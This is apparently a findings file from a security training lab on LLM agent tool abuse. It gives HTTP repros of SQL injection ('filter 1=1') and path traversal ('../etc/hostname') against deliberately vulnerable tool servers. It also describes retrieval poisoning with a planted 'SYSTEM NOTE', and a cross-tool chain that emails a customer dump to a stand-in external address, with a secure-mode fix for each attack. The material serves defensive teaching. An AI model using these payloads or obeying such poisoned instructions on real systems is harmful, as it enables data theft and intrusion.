# Findings -- Module 1: Tool Abuse & Insecure Tool Servers

Raw attack notes and evidence for the v1.0 hard gate (Layer A = tool/RAG HTTP).

## Environment

- Build date: 2026-07-11
- Default model: `qwen2.5:3b-instruct` (agent path only; Layer A does not require LLM)
- Ports: `127.0.0.1:8000` (agent), `:8101–8103` (tools), `:8025` (MailHog UI)
- SECURE_MODE toggled per run via compose env + `--force-recreate`

## Attack 1: Parameter manipulation (SQLi + path traversal)

### Surface
- `tools/db_tool/queries.py::query_vulnerable` concatenates `filter` into SQL.
- `tools/file_tool/server.py::_resolve_vulnerable` naive `os.path.join`.

### Layer A repro (vuln)
```text
POST http://127.0.0.1:8101/invoke  {"table":"customers","filter":"1=1"}
→ count ≥ 2 synthetic customers

POST http://127.0.0.1:8103/invoke  {"op":"read","path":"../etc/hostname"}
→ content of container /etc/hostname (outside /workspace)
```

### Secure mode
- DB requires `customer_id`; raw `filter=1=1` returns error.
- Path resolve uses `Path.relative_to` jail → `escapes workspace jail`.

### OWASP
- LLM06 / ASI02 (excessive agency, tool misuse)

## Attack 2: Retrieval poisoning

### Surface
- Fixture: `data/corpus/poisoned/doc_evil_001.txt` (`trust=untrusted` on ingest).
- Vuln retrieval returns top-k with no trust filter (`rag/retriever.py`).

### Layer A repro (vuln)
```text
POST /lab/ingest-poisoned
GET  /lab/retrieve?q=What%20is%20the%20standard%20shipping%20time%3F
→ documents include SYSTEM NOTE / audit@external-logging.test markers
```

### Secure mode
- Retriever drops `trust=untrusted` chunks → poison markers absent.

### OWASP
- LLM01 indirect injection, LLM04/LLM08 data/vector weaknesses, ASI01/ASI06

### Note
Agent-mediated tool calls after poison (Layer B) depend on local model compliance; not a v1.0 hard gate.

## Attack 3: Cross-tool exfiltration

### Surface
- Unscoped DB read + unrestricted email recipient → MailHog sink.

### Layer A repro (vuln)
```text
db_tool filter 1=1 → rows
email_tool to audit@external-logging.test subject "Customer Export Lab M01"
→ sent=true; MailHog API shows message
```

### Secure mode
- Email domain allow-list (`example.test` only) rejects external-logging.test.
- DB unscoped dump also fails without `customer_id`.

### OWASP
- LLM02 sensitive disclosure, LLM06 / ASI02 tool chaining

## Before/After

Generate with:

```text
SECURE_MODE=false ... attack-01 / metrics-01
SECURE_MODE=true  ... attack-01 / metrics-01
```

Artifact: `metrics/m01/results/before_after.md` plus per-attack JSON under `metrics/m01/results/`.

## Limitations

- Path traversal is **container-local**, not host escape.
- Isolation defense is a **timeout wrapper**, not seccomp/gVisor.
- HITL is **simulated** via `LAB_APPROVE` on the agent executor path.
- Small local models make Layer B flaky; teach with Layer A first.
